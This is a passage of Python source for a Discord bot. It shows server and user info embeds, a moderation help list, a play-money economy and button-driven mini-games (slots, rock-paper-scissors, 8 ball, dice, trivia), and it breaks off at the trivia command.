    key = _warn_key(interaction.guild_id, member.id)
    warn_count = len(warnings.get(key, []))

    embed = _base_embed(f"👤  {member.display_name}", color=member.color if member.color.value else C.PRIMARY)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="Username",     value=f"`{member}`",                                       inline=True)
    embed.add_field(name="ID",           value=f"`{member.id}`",                                    inline=True)
    embed.add_field(name="Bot",          value="Yes" if member.bot else "No",                        inline=True)
    embed.add_field(name="Joined Server",value=f"<t:{int(member.joined_at.timestamp())}:R>",         inline=True)
    embed.add_field(name="Account Created", value=f"<t:{int(member.created_at.timestamp())}:R>",    inline=True)
    embed.add_field(name="⚠️ Warnings",  value=str(warn_count),                                     inline=True)
    embed.add_field(
        name=f"Roles ({len(roles)})",
        value=" ".join(roles[:10]) + (" ..." if len(roles) > 10 else "") if roles else "None",
        inline=False,
    )
    embed.timestamp = datetime.now(UTC)
    await interaction.response.send_message(embed=embed)

# ── /serverinfo ───────────────────────────────────────────────────────────────
@tree.command(name="serverinfo", description="Display information about this server.")
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = _base_embed(g.name, color=C.PRIMARY)
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    embed.add_field(name="Owner",        value=f"<@{g.owner_id}>",                                  inline=True)
    embed.add_field(name="Members",      value=f"**{g.member_count:,}**",                            inline=True)
    embed.add_field(name="Channels",     value=f"**{len(g.channels)}**",                             inline=True)
    embed.add_field(name="Roles",        value=f"**{len(g.roles)}**",                               inline=True)
    embed.add_field(name="Boost Level",  value=f"**{g.premium_tier}** ({g.premium_subscription_count} boosts)", inline=True)
    embed.add_field(name="Created",      value=f"<t:{int(g.created_at.timestamp())}:R>",             inline=True)
    embed.add_field(name="Server ID",    value=f"`{g.id}`",                                         inline=False)
    embed.timestamp = datetime.now(UTC)
    await interaction.response.send_message(embed=embed)

# ── /mod_help ─────────────────────────────────────────────────────────────────
@tree.command(name="mod_help", description="Show all moderation commands.")
async def mod_help(interaction: discord.Interaction):
    embed = _base_embed("🛡️  Moderation Commands", color=C.PRIMARY)
    commands_info = [
        ("/ban",           "Ban a member · `member, reason, delete_days`"),
        ("/unban",         "Unban a user by ID · `user_id, reason`"),
        ("/kick",          "Kick a member · `member, reason`"),
        ("/timeout",       "Mute a member temporarily · `member, minutes, reason`"),
        ("/untimeout",     "Remove a timeout · `member, reason`"),
        ("/warn",          "Issue a formal warning · `member, reason`"),
        ("/warnings",      "View warnings for a member · `member`"),
        ("/clearwarnings", "Clear all warnings · `member`"),
        ("/purge",         "Bulk-delete messages · `amount, member?`"),
        ("/slowmode",      "Set channel slowmode · `seconds`"),
        ("/lock",          "Lock a channel · `channel?, reason`"),
        ("/unlock",        "Unlock a channel · `channel?, reason`"),
        ("/userinfo",      "Info about a member · `member?`"),
        ("/serverinfo",    "Info about the server"),
    ]
    for name, desc in commands_info:
        embed.add_field(name=name, value=desc, inline=False)
    embed.set_footer(text="⚡ Requires appropriate permissions for each command.")
    await interaction.response.send_message(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 💰 ECONOMY COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@tree.command(name="balance", description="Check your balance and stats!")
async def balance(interaction: discord.Interaction):
    user_data = get_user_data(interaction.user.id)
    bal       = user_data["balance"]
    wins      = user_data.get("wins", 0)
    losses    = user_data.get("losses", 0)
    total_won = user_data.get("total_won", 0)
    total_lost= user_data.get("total_lost", 0)
    winrate   = round((wins / (wins + losses)) * 100, 1) if (wins + losses) > 0 else 0

    embed = _base_embed(f"💰  {interaction.user.display_name}'s Wallet", color=C.SUCCESS)
    embed.set_thumbnail(url=interaction.user.display_avatar.url)
    embed.add_field(name="💵 Balance",    value=f"**${bal:,}**",        inline=True)
    embed.add_field(name="📈 Win Rate",   value=f"**{winrate}%**",      inline=True)
    embed.add_field(name="🏆 Wins",       value=f"**{wins}**",          inline=True)
    embed.add_field(name="💔 Losses",     value=f"**{losses}**",        inline=True)
    embed.add_field(name="💸 Total Won",  value=f"**${total_won:,}**",  inline=True)
    embed.add_field(name="🔥 Total Lost", value=f"**${total_lost:,}**", inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="daily", description="Claim your daily $100!")
async def daily(interaction: discord.Interaction):
    can_claim, remaining = can_claim_daily(interaction.user.id)
    if can_claim:
        new_bal = claim_daily(interaction.user.id)
        embed = _base_embed(
            "💸  Daily Reward Claimed!",
            f"_{_flavor('daily_claimed')}_\n\nYou claimed **${DAILY_AMOUNT}**!\n\n💰  New balance: **${new_bal:,}**\n_Come back in 24 hours!_",
            C.SUCCESS,
        )
        embed.set_thumbnail(url=interaction.user.display_avatar.url)
    else:
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes = remainder // 60
        embed = _base_embed(
            "⏱️  Already Claimed",
            f"_{_flavor('daily_already')}_\n\nCome back in **{hours}h {minutes}m**!",
            C.DANGER,
        )
    await interaction.response.send_message(embed=embed)

@tree.command(name="leaderboard", description="See the richest players!")
async def leaderboard(interaction: discord.Interaction):
    top = get_leaderboard()
    embed = _base_embed("🏆  Richest Players", color=C.CASINO)
    medals = ["🥇", "🥈", "🥉"]
    description = ""
    for i, (uid, info) in enumerate(top):
        medal = medals[i] if i < 3 else f"**#{i+1}**"
        try:
            user = await bot.fetch_user(int(uid))
            name = user.display_name
        except Exception:
            name = f"User {uid}"
        winrate = round(
            (info.get("wins", 0) / max(info.get("wins", 0) + info.get("losses", 0), 1)) * 100, 1
        )
        description += f"{medal}  **{name}** — ${info['balance']:,}  _(WR: {winrate}%)_\n"
    embed.description = description or "No players yet!"
    embed.set_footer(text="Play games to earn money and climb the leaderboard!")
    await interaction.response.send_message(embed=embed)

@tree.command(name="give", description="Give money to another player!")
@app_commands.describe(user="Who to give money to", amount="How much to give")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    if user == interaction.user:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You can't give money to yourself!", C.DANGER), ephemeral=True
        )
        return
    if amount <= 0:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "Amount must be more than $0!", C.DANGER), ephemeral=True
        )
        return
    bal = get_balance(interaction.user.id)
    if amount > bal:
        await interaction.response.send_message(
            embed=_base_embed("❌  Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True
        )
        return
    update_balance(interaction.user.id, -amount)
    update_balance(user.id, amount)
    embed = _base_embed(
        "💸  Money Sent!",
        f"_{_flavor('transfer_success')}_\n{interaction.user.mention} sent **${amount:,}** to {user.mention}!",
        C.SUCCESS,
    )
    embed.add_field(name="Your new balance", value=f"**${get_balance(interaction.user.id):,}**", inline=True)
    await interaction.response.send_message(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 🎮 INTERACTIVE GAMES
# ══════════════════════════════════════════════════════════════════════════════

# ── 🎰 SLOTS ──────────────────────────────────────────────────────────────────
class SlotsView(discord.ui.View):
    def __init__(self, user, bet):
        super().__init__(timeout=60)
        self.user = user
        self.bet = bet
        self.spins_left = 3

    def spin_reels(self):
        symbols = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "7️⃣"]
        weights = [30, 25, 20, 15, 6, 3, 1]
        return random.choices(symbols, weights=weights, k=3)

    def calculate_win(self, reels):
        if reels[0] == reels[1] == reels[2]:
            multipliers = {"💎": 20, "7️⃣": 15, "⭐": 10}
            return multipliers.get(reels[0], 5), True
        elif reels[0] == reels[1] or reels[1] == reels[2] or reels[0] == reels[2]:
            return 1, False
        return 0, False

    def build_embed(self, reels, result_text, color):
        embed = _base_embed("🎰  Slot Machine", color=color)
        embed.add_field(name="Reels",       value=f"# {' | '.join(reels)}", inline=False)
        embed.add_field(name="Result",      value=result_text,              inline=False)
        embed.add_field(name="💵 Bet",      value=f"**${self.bet:,}**",     inline=True)
        embed.add_field(name="🔄 Spins Left",value=f"**{self.spins_left}**",inline=True)
        embed.add_field(name="💰 Balance",  value=f"**${get_balance(self.user.id):,}**", inline=True)
        return embed

    @discord.ui.button(label="🎰 Spin!", style=discord.ButtonStyle.green)
    async def spin(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True)
            return
        reels = self.spin_reels()
        multiplier, jackpot = self.calculate_win(reels)
        self.spins_left -= 1

        if multiplier > 1:
            winnings = self.bet * multiplier
            update_balance_with_stats(self.user.id, winnings)
            if jackpot:
                result = f"🎉  **JACKPOT! {multiplier}x!** _{_flavor('win_big')}_ You won **${winnings:,}**!"
                color = C.CASINO
            else:
                result = f"🎊  **{multiplier}x multiplier!** _{_flavor('win_small')}_ You won **${winnings:,}**!"
                color = C.SUCCESS
        elif multiplier == 1:
            result = f"😐  **Two of a kind!** _{_flavor('tie')}_ Bet returned **${self.bet:,}**"
            color = C.WARNING
        else:
            update_balance_with_stats(self.user.id, -self.bet)
            result = f"❌  **No match!** _{_flavor('lose')}_ Lost **${self.bet:,}**"
            color = C.DANGER

        if self.spins_left <= 0 or get_balance(self.user.id) < self.bet:
            button.disabled = True
            self.stop()

        embed = self.build_embed(reels, result, color)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="💰 Cash Out", style=discord.ButtonStyle.red)
    async def cash_out(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True)
            return
        embed = _base_embed(
            "🎰  Cashed Out!",
            f"Thanks for playing!\nYour balance: **${get_balance(self.user.id):,}**",
            C.PRIMARY,
        )
        self.stop()
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="slots", description="Spin the slot machine!")
@app_commands.describe(bet="Amount to bet per spin (default: 10)")
async def slots(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Bet must be more than $0!", C.DANGER), ephemeral=True); return
    if bet > bal:
        await interaction.response.send_message(embed=_base_embed("❌ Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True); return

    view = SlotsView(interaction.user, bet)
    embed = _base_embed("🎰  Slot Machine", color=C.PRIMARY)
    embed.add_field(name="💵 Bet",        value=f"**${bet:,}** per spin",  inline=True)
    embed.add_field(name="🔄 Free Spins", value="**3**",                   inline=True)
    embed.add_field(name="💰 Balance",    value=f"**${bal:,}**",           inline=True)
    embed.add_field(name="Payouts", value="💎 = 20x  ·  7️⃣ = 15x  ·  ⭐ = 10x\n🍇 = 5x  ·  Two of a kind = return bet", inline=False)
    embed.set_footer(text="Press Spin to start!")
    await interaction.response.send_message(embed=embed, view=view)


# ── 🪨 ROCK PAPER SCISSORS ────────────────────────────────────────────────────
class RPSView(discord.ui.View):
    def __init__(self, user, bet):
        super().__init__(timeout=60)
        self.user = user
        self.bet = bet
        self.player_wins = 0
        self.bot_wins = 0
        self.round = 1
        self.max_rounds = 3

    def play_round(self, choice):
        options = ["rock", "paper", "scissors"]
        emojis  = {"rock": "🪨", "paper": "📄", "scissors": "✂️"}
        bot_choice = random.choice(options)
        if choice == bot_choice:
            outcome = "tie"
        elif (choice == "rock" and bot_choice == "scissors") or \
             (choice == "paper" and bot_choice == "rock") or \
             (choice == "scissors" and bot_choice == "paper"):
            outcome = "win"; self.player_wins += 1
        else:
            outcome = "loss"; self.bot_wins += 1
        return emojis[choice], emojis[bot_choice], outcome

    def build_embed(self, player_emoji, bot_emoji, outcome, round_result):
        color = C.SUCCESS if outcome == "win" else C.DANGER if outcome == "loss" else C.WARNING
        embed = _base_embed(f"🪨  Rock Paper Scissors — Round {self.round - 1}/{self.max_rounds}", color=color)
        embed.add_field(name="Your Pick",  value=player_emoji,   inline=True)
        embed.add_field(name="Bot's Pick", value=bot_emoji,      inline=True)
        embed.add_field(name="Round",      value=round_result,   inline=True)
        embed.add_field(name="Score",  value=f"You **{self.player_wins}** — Bot **{self.bot_wins}**", inline=False)
        embed.add_field(name="💵 Bet",     value=f"**${self.bet:,}**",                               inline=True)
        embed.add_field(name="💰 Balance", value=f"**${get_balance(self.user.id):,}**",               inline=True)
        return embed

    async def handle_choice(self, interaction, choice):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        player_emoji, bot_emoji, outcome = self.play_round(choice)
        self.round += 1
        round_result = "🎉 You win this round!" if outcome == "win" else "❌ Bot wins this round!" if outcome == "loss" else "🤝 Tie!"
        embed = self.build_embed(player_emoji, bot_emoji, outcome, round_result)
        game_over = self.round > self.max_rounds or self.player_wins == 2 or self.bot_wins == 2
        if game_over:
            for child in self.children: child.disabled = True
            self.stop()
            if self.player_wins > self.bot_wins:
                new_bal = update_balance_with_stats(self.user.id, self.bet * 2)
                embed.add_field(name="🏆 GAME OVER", value=f"**You won the match! +${self.bet * 2:,}**\nBalance: **${new_bal:,}**", inline=False)
                embed.color = C.CASINO
            elif self.bot_wins > self.player_wins:
                new_bal = update_balance_with_stats(self.user.id, -self.bet)
                embed.add_field(name="💔 GAME OVER", value=f"**Bot wins the match! -${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
                embed.color = C.DANGER
            else:
                embed.add_field(name="🤝 GAME OVER", value=f"**It's a draw! Bet returned.**\nBalance: **${get_balance(self.user.id):,}**", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="🪨 Rock",     style=discord.ButtonStyle.grey)
    async def rock(self, interaction, button):     await self.handle_choice(interaction, "rock")
    @discord.ui.button(label="📄 Paper",    style=discord.ButtonStyle.blurple)
    async def paper(self, interaction, button):    await self.handle_choice(interaction, "paper")
    @discord.ui.button(label="✂️ Scissors", style=discord.ButtonStyle.red)
    async def scissors(self, interaction, button): await self.handle_choice(interaction, "scissors")

@tree.command(name="rps", description="Play Best of 3 Rock Paper Scissors!")
@app_commands.describe(bet="Amount to bet (default: 10)")
async def rps(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Bet must be more than $0!", C.DANGER), ephemeral=True); return
    if bet > bal:
        await interaction.response.send_message(embed=_base_embed("❌ Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True); return
    view = RPSView(interaction.user, bet)
    embed = _base_embed("🪨  Rock Paper Scissors — Best of 3!", color=C.PRIMARY)
    embed.add_field(name="💵 Bet",    value=f"**${bet:,}**",        inline=True)
    embed.add_field(name="🏆 Win",    value=f"**+${bet * 2:,}**",   inline=True)
    embed.add_field(name="💔 Lose",   value=f"**-${bet:,}**",       inline=True)
    embed.add_field(name="Rules", value="Win 2 out of 3 rounds to take the prize!\nTied rounds don't count.", inline=False)
    embed.set_footer(text="Choose your weapon!")
    await interaction.response.send_message(embed=embed, view=view)


# ── 🎱 8 BALL ─────────────────────────────────────────────────────────────────
class EightBallView(discord.ui.View):
    def __init__(self, user, question, bet):
        super().__init__(timeout=30)
        self.user = user
        self.question = question
        self.bet = bet

    @discord.ui.button(label="🎱 Reveal Answer", style=discord.ButtonStyle.blurple)
    async def reveal(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        positive = ["✅ It is certain.", "✅ It is decidedly so.", "✅ Without a doubt.", "✅ Yes, definitely.", "✅ You may rely on it.", "✅ As I see it, yes.", "✅ Most likely.", "✅ Outlook good.", "✅ Yes.", "✅ Signs point to yes."]
        neutral  = ["🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.", "🤷 Cannot predict now.", "🤷 Concentrate and ask again."]
        negative = ["❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.", "❌ Outlook not so good.", "❌ Very doubtful."]
        answer = random.choice(positive + neutral + negative)
        if answer in positive:
            winnings = self.bet * 2
            new_bal  = update_balance_with_stats(self.user.id, winnings)
            result, color = f"🎉  **YES answer!** You win **${winnings:,}**!", C.SUCCESS
        elif answer in neutral:
            new_bal = get_balance(self.user.id)
            result, color = "🤷  **Neutral!** Bet returned.", C.WARNING
        else:
            new_bal = update_balance_with_stats(self.user.id, -self.bet)
            result, color = f"❌  **NO answer!** Lost **${self.bet:,}**!", C.DANGER

        embed = _base_embed("🎱  The Magic 8 Ball Speaks...", color=color)
        embed.add_field(name="❓ Your Question", value=self.question,          inline=False)
        embed.add_field(name="🎱 The Answer",    value=f"**{answer}**",        inline=False)
        embed.add_field(name="💰 Result",        value=result,                 inline=False)
        embed.add_field(name="💵 Balance",       value=f"**${new_bal:,}**",    inline=True)
        button.disabled = True; self.stop()
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.red)
    async def cancel(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        self.stop()
        for child in self.children: child.disabled = True
        await interaction.response.edit_message(
            embed=_base_embed("🎱  8 Ball Cancelled", "The spirits were not consulted.", C.NEUTRAL), view=self
        )

@tree.command(name="8ball", description="Ask the magic 8 ball and bet on a YES answer!")
@app_commands.describe(question="Your yes/no question", bet="Amount to bet (default: 10)")
async def eightball(interaction: discord.Interaction, question: str, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Bet must be more than $0!", C.DANGER), ephemeral=True); return
    if bet > bal:
        await interaction.response.send_message(embed=_base_embed("❌ Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True); return
    view = EightBallView(interaction.user, question, bet)
    embed = _base_embed("🎱  Magic 8 Ball", color=C.PURPLE)
    embed.add_field(name="❓ Question",  value=question,               inline=False)
    embed.add_field(name="💵 Bet",       value=f"**${bet:,}** on YES", inline=True)
    embed.add_field(name="🏆 Win",       value=f"**+${bet * 2:,}**",   inline=True)
    embed.add_field(name="🤷 Neutral",   value="Bet returned",         inline=True)
    embed.add_field(name="❌ Lose",      value=f"**-${bet:,}**",       inline=True)
    embed.set_footer(text="Press Reveal Answer when you're ready...")
    await interaction.response.send_message(embed=embed, view=view)


# ── 🎲 DICE ───────────────────────────────────────────────────────────────────
class DiceView(discord.ui.View):
    def __init__(self, user, bet, sides):
        super().__init__(timeout=60)
        self.user = user; self.bet = bet; self.sides = sides
        self.rounds_left = 3; self.player_score = 0; self.bot_score = 0

    @discord.ui.button(label="🎲 Roll!", style=discord.ButtonStyle.green)
    async def roll(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        player_roll = random.randint(1, self.sides)
        bot_roll    = random.randint(1, self.sides)
        self.rounds_left -= 1
        if player_roll > bot_roll:
            self.player_score += 1
            round_result, color = f"🎉 You win this roll! _{_flavor('win_small')}_ (**{player_roll}** vs **{bot_roll}**)", C.SUCCESS
        elif bot_roll > player_roll:
            self.bot_score += 1
            round_result, color = f"❌ Bot wins this roll! _{_flavor('lose')}_ (**{player_roll}** vs **{bot_roll}**)", C.DANGER
        else:
            round_result, color = f"🤝 Tie! (**{player_roll}** vs **{bot_roll}**)", C.WARNING

        embed = _base_embed(f"🎲  Dice Duel (d{self.sides})", color=color)
        embed.add_field(name="🎲 This Roll",  value=round_result,                                          inline=False)
        embed.add_field(name="📊 Score",      value=f"You **{self.player_score}** — Bot **{self.bot_score}**", inline=True)
        embed.add_field(name="🔄 Rolls Left", value=f"**{self.rounds_left}**",                              inline=True)
        embed.add_field(name="💵 Bet",        value=f"**${self.bet:,}**",                                   inline=True)

        if self.rounds_left <= 0:
            button.disabled = True; self.stop()
            if self.player_score > self.bot_score:
                new_bal = update_balance_with_stats(self.user.id, self.bet * 2)
                embed.add_field(name="🏆 GAME OVER", value=f"**You win! +${self.bet * 2:,}**\nBalance: **${new_bal:,}**", inline=False)
                embed.color = C.CASINO
            elif self.bot_score > self.player_score:
                new_bal = update_balance_with_stats(self.user.id, -self.bet)
                embed.add_field(name="💔 GAME OVER", value=f"**Bot wins! -${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
                embed.color = C.DANGER
            else:
                embed.add_field(name="🤝 GAME OVER", value=f"**Draw! Bet returned.**\nBalance: **${get_balance(self.user.id):,}**", inline=False)
        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="dice", description="Play a 3-round Dice Duel!")
@app_commands.describe(sides="Number of sides on the dice (default: 6)", bet="Amount to bet (default: 10)")
async def dice(interaction: discord.Interaction, sides: int = 6, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if sides < 2 or sides > 100:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Sides must be between 2 and 100!", C.DANGER), ephemeral=True); return
    if bet <= 0:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Bet must be more than $0!", C.DANGER), ephemeral=True); return
    if bet > bal:
        await interaction.response.send_message(embed=_base_embed("❌ Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True); return
    view = DiceView(interaction.user, bet, sides)
    embed = _base_embed(f"🎲  Dice Duel — d{sides}", color=C.PRIMARY)
    embed.add_field(name="💵 Bet",    value=f"**${bet:,}**",        inline=True)
    embed.add_field(name="🔄 Rounds", value="**3**",                 inline=True)
    embed.add_field(name="🏆 Win",    value=f"**+${bet * 2:,}**",   inline=True)
    embed.add_field(name="Rules", value=f"Roll a d{sides} against the bot 3 times.\nHighest score after 3 rounds wins!", inline=False)
    embed.set_footer(text="Press Roll to start!")
    await interaction.response.send_message(embed=embed, view=view)


# ── ❓ TRIVIA ─────────────────────────────────────────────────────────────────
TRIVIA_QUESTIONS = {
    "easy": [
        {"q": "What is the capital of France?", "a": "paris", "reward": 50},
        {"q": "How many sides does a hexagon have?", "a": "6", "reward": 50},
        {"q": "What color is the sky on a clear day?", "a": "blue", "reward": 50},
        {"q": "How many legs does a spider have?", "a": "8", "reward": 50},
        {"q": "What is the largest planet in our solar system?", "a": "jupiter", "reward": 50},
        {"q": "What is the capital of Japan?", "a": "tokyo", "reward": 50},
        {"q": "How many continents are there?", "a": "7", "reward": 50},
        {"q": "What is the fastest land animal?", "a": "cheetah", "reward": 50},
        {"q": "What planet is known as the Red Planet?", "a": "mars", "reward": 50},
        {"q": "What is 7 x 8?", "a": "56", "reward": 50},
        {"q": "What is the capital of Italy?", "a": "rome", "reward": 50},
        {"q": "How many days are in a week?", "a": "7", "reward": 50},
        {"q": "What color are bananas?", "a": "yellow", "reward": 50},
        {"q": "What do bees make?", "a": "honey", "reward": 50},
        {"q": "What is 10 + 5?", "a": "15", "reward": 50},
        {"q": "What is the opposite of hot?", "a": "cold", "reward": 50},
        {"q": "What shape has three sides?", "a": "triangle", "reward": 50},
        {"q": "What is the capital of the United States?", "a": "washington dc", "reward": 50},
        {"q": "What ocean is on the east coast of the United States?", "a": "atlantic", "reward": 50},
        {"q": "How many hours are in a day?", "a": "24", "reward": 50},
        {"q": "What animal says 'meow'?", "a": "cat", "reward": 50},
        {"q": "What is 9 + 1?", "a": "10", "reward": 50},
        {"q": "What color is grass?", "a": "green", "reward": 50},
        {"q": "What is frozen water called?", "a": "ice", "reward": 50},
        {"q": "How many fingers are on one hand?", "a": "5", "reward": 50},
        {"q": "What is the capital of Canada?", "a": "ottawa", "reward": 50},
        {"q": "What do cows drink?", "a": "water", "reward": 50},
        {"q": "What is 5 x 5?", "a": "25", "reward": 50},
        {"q": "What is the color of snow?", "a": "white", "reward": 50},
        {"q": "What animal barks?", "a": "dog", "reward": 50},
        {"q": "How many wheels does a bicycle have?", "a": "2", "reward": 50},
        {"q": "What is the first letter of the alphabet?", "a": "a", "reward": 50},
        {"q": "What fruit is red and often associated with doctors?", "a": "apple", "reward": 50},
        {"q": "What is 2 + 2?", "a": "4", "reward": 50},
        {"q": "What is the capital of Spain?", "a": "madrid", "reward": 50},
    ],
    "medium": [
        {"q": "What is the chemical symbol for water?", "a": "h2o", "reward": 150},
        {"q": "What is the square root of 144?", "a": "12", "reward": 150},
        {"q": "Who painted the Mona Lisa?", "a": "da vinci", "reward": 150},
        {"q": "What is the smallest prime number?", "a": "2", "reward": 150},
        {"q": "What element has the symbol Au?", "a": "gold", "reward": 150},
        {"q": "What year did World War II end?", "a": "1945", "reward": 150},
        {"q": "How many players are on a basketball team on the court?", "a": "5", "reward": 150},
        {"q": "What is the largest ocean on Earth?", "a": "pacific", "reward": 150},
        {"q": "Who wrote 'Romeo and Juliet'?", "a": "shakespeare", "reward": 150},
        {"q": "What gas do plants absorb from the atmosphere?", "a": "carbon dioxide", "reward": 150},
        {"q": "What is the capital of Australia?", "a": "canberra", "reward": 150},
        {"q": "How many degrees are in a right angle?", "a": "90", "reward": 150},
        {"q": "What is the boiling point of water in celsius?", "a": "100", "reward": 150},
        {"q": "Who discovered gravity (falling apple story)?", "a": "newton", "reward": 150},
        {"q": "What is the hardest natural substance?", "a": "diamond", "reward": 150},
        {"q": "What is the capital of Germany?", "a": "berlin", "reward": 150},
        {"q": "What is 15 x 3?", "a": "45", "reward": 150},
        {"q": "Which planet has rings?", "a": "saturn", "reward": 150},
        {"q": "What language is primarily spoken in Brazil?", "a": "portuguese", "reward": 150},
        {"q": "How many bones are in an adult human hand?", "a": "27", "reward": 150},
        {"q": "What is the largest desert in the world?", "a": "antarctica", "reward": 150},
        {"q": "What organ pumps blood through the body?", "a": "heart", "reward": 150},
        {"q": "What is the capital of India?", "a": "new delhi", "reward": 150},
        {"q": "What is the freezing point of water in celsius?", "a": "0", "reward": 150},
        {"q": "Who wrote '1984'?", "a": "orwell", "reward": 150},
        {"q": "What is 100 divided by 4?", "a": "25", "reward": 150},
        {"q": "What is the main gas in Earth's atmosphere?", "a": "nitrogen", "reward": 150},
        {"q": "Which continent is Egypt in?", "a": "africa", "reward": 150},
        {"q": "How many strings does a standard guitar have?", "a": "6", "reward": 150},
        {"q": "What is the capital of Mexico?", "a": "mexico city", "reward": 150},
        {"q": "What does DNA stand for? (short answer)", "a": "deoxyribonucleic acid", "reward": 150},
        {"q": "What is 11 x 11?", "a": "121", "reward": 150},
        {"q": "What is the tallest mammal?", "a": "giraffe", "reward": 150},
    ],
    "hard": [
        {"q": "How many bones are in the human body?", "a": "206", "reward": 300},
        {"q": "What is the speed of light in km/s? (approximate)", "a": "300000", "reward": 300},
        {"q": "What is the atomic number of carbon?", "a": "6", "reward": 300},
        {"q": "In what year was the Eiffel Tower built?", "a": "1889", "reward": 300},
        {"q": "What is the longest river in the world?", "a": "nile", "reward": 300},
        {"q": "What is the chemical symbol for gold?", "a": "au", "reward": 300},
        {"q": "Who developed the theory of relativity?", "a": "einstein", "reward": 300},
        {"q": "What is the capital of Iceland?", "a": "reykjavik", "reward": 300},
        {"q": "What is the largest organ in the human body?", "a": "skin", "reward": 300},
        {"q": "What year did the Titanic sink?", "a": "1912", "reward": 300},
        {"q": "What is the smallest unit of matter?", "a": "atom", "reward": 300},
        {"q": "Who painted the ceiling of the Sistine Chapel?", "a": "michelangelo", "reward": 300},
        {"q": "What is the powerhouse of the cell?", "a": "mitochondria", "reward": 300},
        {"q": "What is the capital of South Korea?", "a": "seoul", "reward": 300},
        {"q": "What is 13 squared?", "a": "169", "reward": 300},
        {"q": "Which element has atomic number 1?", "a": "hydrogen", "reward": 300},
        {"q": "What is the longest bone in the human body?", "a": "femur", "reward": 300},
        {"q": "What is the largest island in the world?", "a": "greenland", "reward": 300},
        {"q": "What is the capital of Argentina?", "a": "buenos aires", "reward": 300},
        {"q": "Who wrote 'The Odyssey'?", "a": "homer", "reward": 300},
        {"q": "What is the square root of 225?", "a": "15", "reward": 300},
        {"q": "What is the chemical symbol for sodium?", "a": "na", "reward": 300},
        {"q": "How many elements are in the periodic table?", "a": "118", "reward": 300},
        {"q": "What is the capital of Norway?", "a": "oslo", "reward": 300},
        {"q": "What is 144 divided by 12?", "a": "12", "reward": 300},
        {"q": "Which planet is closest to the sun?", "a": "mercury", "reward": 300},
        {"q": "What is the study of earthquakes called?", "a": "seismology", "reward": 300},
        {"q": "Who discovered penicillin?", "a": "fleming", "reward": 300},
        {"q": "What is the capital of Turkey?", "a": "ankara", "reward": 300},
        {"q": "What is the freezing point of water in fahrenheit?", "a": "32", "reward": 300},
        {"q": "What is the tallest mountain in the world?", "a": "everest", "reward": 300},
    ],
}

class TriviaView(discord.ui.View):
    def __init__(self, user, question, difficulty):
        super().__init__(timeout=30)
        self.user = user; self.question = question; self.difficulty = difficulty; self.answered = False

    @discord.ui.button(label="💡 50/50 Lifeline", style=discord.ButtonStyle.grey)
    async def lifeline(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        button.disabled = True
        await interaction.response.edit_message(
            content=f"💡  **50/50 Lifeline used!** Hint: The answer starts with **'{self.question['a'][0].upper()}'**",
            view=self,
        )

    @discord.ui.button(label="⏭️ Skip", style=discord.ButtonStyle.blurple)
    async def skip(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        self.answered = True; self.stop()
        for child in self.children: child.disabled = True
        await interaction.response.edit_message(
            embed=_base_embed("⏭️  Question Skipped", f"The answer was **{self.question['a']}**.\nNo money lost!", C.NEUTRAL),
            view=self,
        )

@tree.command(name="trivia", description="Answer trivia and win money!")
@app_commands.describe(difficulty="Choose difficulty: easy, medium, or hard")
